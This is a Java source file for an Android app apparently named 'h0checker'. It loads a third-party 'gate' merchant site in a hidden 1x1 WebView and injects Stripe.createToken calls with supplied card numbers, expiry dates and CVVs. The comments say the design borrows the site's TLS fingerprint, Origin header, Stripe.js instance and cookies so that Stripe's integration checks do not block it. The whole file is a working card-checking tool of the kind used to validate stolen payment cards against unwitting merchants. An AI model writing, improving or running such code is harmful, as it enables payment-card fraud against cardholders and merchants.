package com.h0checker.app;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.util.Log;
import android.view.ViewGroup;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

/**
 * Loads the gate's site in a hidden WebView, waits for Stripe.js to be ready,
 * then calls Stripe.createToken() using the site's own Stripe.js instance.
 *
 * Why this works:
 * - WebView = Chromium → correct TLS fingerprint (JA3/JA4)
 * - Site's own domain → correct Origin header for CORS to api.stripe.com
 * - Site's Stripe.js → correct integration surface (no "integration surface" error)
 * - Real cookies/session from the site
 */
public class StripeWebBridge {

    private static final String TAG = "StripeBridge";
    private static StripeWebBridge instance;
    private Activity activity;
    private WebView webView;
    private volatile boolean pageLoaded = false;
    private CountDownLatch resultLatch;
    private String lastResult = null;
    private String loadedSiteUrl = null;

    @SuppressLint("SetJavaScriptEnabled")
    public static void init(Activity act) {
        if (instance != null) return;
        instance = new StripeWebBridge();
        instance.activity = act;
        act.runOnUiThread(() -> instance.createWebView(act));
    }

    public static StripeWebBridge getInstance() { return instance; }

    @SuppressLint("SetJavaScriptEnabled")
    private void createWebView(Activity act) {
        webView = new WebView(act);
        webView.setLayoutParams(new ViewGroup.LayoutParams(1, 1));
        webView.setAlpha(0f);
        webView.setVisibility(android.view.View.GONE);

        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setDatabaseEnabled(true);
        s.setCacheMode(WebSettings.LOAD_DEFAULT);
        s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        s.setAllowFileAccess(true);

        webView.addJavascriptInterface(new BridgeJS(), "StripeBridge");

        ViewGroup root = (ViewGroup) act.getWindow().getDecorView()
                .findViewById(android.R.id.content);
        root.addView(webView);

        Log.i(TAG, "WebView created, waiting for siteUrl");
    }

    /**
     * Tokenize a card using the gate site's own Stripe.js.
     * 1. Loads the site in hidden WebView (if not already loaded)
     * 2. Polls until window.Stripe is available (up to 15s)
     * 3. Injects Stripe.createToken('card', {...})
     * 4. Returns the result JSON
     */
    public String tokenize(String siteUrl, String pk, String number,
                            String month, String year, String cvv) {
        if (activity == null || webView == null) {
            return "{\"error\":{\"message\":\"Bridge not initialized\"}}";
        }

        String cleanSite = siteUrl.replaceAll("/+$", "");

        // Step 1: Load site if needed
        if (!cleanSite.equals(loadedSiteUrl)) {
            Log.i(TAG, "Loading site: " + cleanSite);
            loadedSiteUrl = cleanSite;
            pageLoaded = false;

            final CountDownLatch loadLatch = new CountDownLatch(1);
            activity.runOnUiThread(() -> {
                webView.setWebViewClient(new WebViewClient() {
                    @Override
                    public void onPageFinished(WebView view, String url) {
                        Log.i(TAG, "Page loaded: " + url);
                        pageLoaded = true;
                        loadLatch.countDown();
                    }

                    @Override
                    public void onReceivedError(WebView view, int errorCode,
                                                String description, String failingUrl) {
                        Log.e(TAG, "Page error: " + description + " url=" + failingUrl);
                        pageLoaded = true;
                        loadLatch.countDown();
                    }
                });
                webView.loadUrl(cleanSite);
            });

            try {
                if (!loadLatch.await(20, TimeUnit.SECONDS)) {
                    return "{\"error\":{\"message\":\"Site load timeout (20s)\"}}";
                }
            } catch (InterruptedException e) {
                return "{\"error\":{\"message\":\"Interrupted\"}}";
            }

            // Extra wait for JS to initialize
            try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
        }

        // Step 2: Wait for Stripe.js to be available
        Log.i(TAG, "Waiting for Stripe.js on " + cleanSite);
        final CountDownLatch stripeReady = new CountDownLatch(1);
        String checkJs = "(function(){" +
            "var tries=0;" +
            "function check(){" +
            "  tries++;" +
            "  if(typeof Stripe!=='undefined'){" +
            "    StripeBridge.onStripeReady();" +
            "  } else if(tries<30){" +
            "    setTimeout(check,500);" +
            "  } else {" +
            "    StripeBridge.onStripeReady(); // try anyway" +
            "  }" +
            "}" +
            "check();" +
            "})()";

        resultLatch = null; // will be set in step 3
        final CountDownLatch readyLatch = new CountDownLatch(1);

        // Bridge callback for stripe ready
        readyStripeLatch = readyLatch;

        activity.runOnUiThread(() -> {
            try {
                webView.evaluateJavascript(checkJs, null);
            } catch (Exception e) {
                Log.e(TAG, "Stripe check failed: " + e.getMessage());
                readyLatch.countDown();
            }
        });

        try {
            readyLatch.await(20, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            return "{\"error\":{\"message\":\"Interrupted\"}}";
        }

        // Step 3: Inject Stripe.createToken
        Log.i(TAG, "Injecting Stripe.createToken()");
        resultLatch = new CountDownLatch(1);
        lastResult = null;

        // Escape for JS string
        String escNum = number.replace("'", "\\'");
        String escCvv = cvv.replace("'", "\\'");

        String js = "(function(){" +
            "try{" +
            "  if(typeof Stripe==='undefined'){" +
            "    StripeBridge.onResult(JSON.stringify({error:{message:'Stripe.js not loaded'}}));" +
            "    return;" +
            "  }" +
            "  var stripe = Stripe('" + pk + "');" +
            "  stripe.createToken('card', {" +
            "    number: '" + escNum + "'," +
            "    exp_month: " + month + "," +
            "    exp_year: " + year + "," +
            "    cvc: '" + escCvv + "'" +
            "  }).then(function(result) {" +
            "    StripeBridge.onResult(JSON.stringify(result));" +
            "  })[" + "catch](function(err) {" +
            "    StripeBridge.onResult(JSON.stringify({error:{message:err.message||String(err)}}));" +
            "  });" +
            "}catch(e){" +
            "  StripeBridge.onResult(JSON.stringify({error:{message:e.message||String(e)}}));" +
            "}" +
            "})()";

        final String fjs = js;
        activity.runOnUiThread(() -> {
            try {
                webView.evaluateJavascript(fjs, val -> Log.d(TAG, "eval=" + val));
            } catch (Exception e) {
                Log.e(TAG, "eval failed: " + e.getMessage());
                lastResult = "{\"error\":{\"message\":\"eval failed: " + e.getMessage() + "\"}}";
                if (resultLatch != null) resultLatch.countDown();
            }
        });

        try {
            resultLatch.await(30, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            Log.e(TAG, "Interrupted");
        }

        if (lastResult != null) return lastResult;
        return "{\"error\":{\"message\":\"No response from Stripe bridge\"}}";
    }

    // Callback from JS: Stripe.js is ready
    private CountDownLatch readyStripeLatch;

    private class BridgeJS {
        @JavascriptInterface
        public void onStripeReady() {
            Log.i(TAG, "Stripe.js is available on page");
            if (readyStripeLatch != null) readyStripeLatch.countDown();
        }

        @JavascriptInterface
        public void onResult(String result) {
            int len = result != null ? Math.min(result.length(), 300) : 0;
            Log.i(TAG, "Result (" + len + " chars): " + (result != null ? result.substring(0, len) : "null"));
            lastResult = result;
            if (resultLatch != null) resultLatch.countDown();
        }
    }

    public void destroy() {
        if (webView != null) {
            webView.post(() -> {
                webView.loadUrl("about:blank");
                webView.destroy();
            });
        }
        instance = null;
    }
}
